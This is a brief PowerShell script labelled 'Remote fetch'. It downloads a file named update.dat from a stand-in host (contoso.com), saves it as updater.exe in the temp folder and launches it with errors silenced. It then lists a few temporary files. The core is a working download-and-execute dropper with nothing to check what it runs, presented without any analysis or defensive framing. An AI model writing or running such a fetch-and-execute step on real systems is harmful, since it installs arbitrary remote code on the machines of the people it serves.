<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://contoso.com/update.dat",
    [string]$DownloadPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
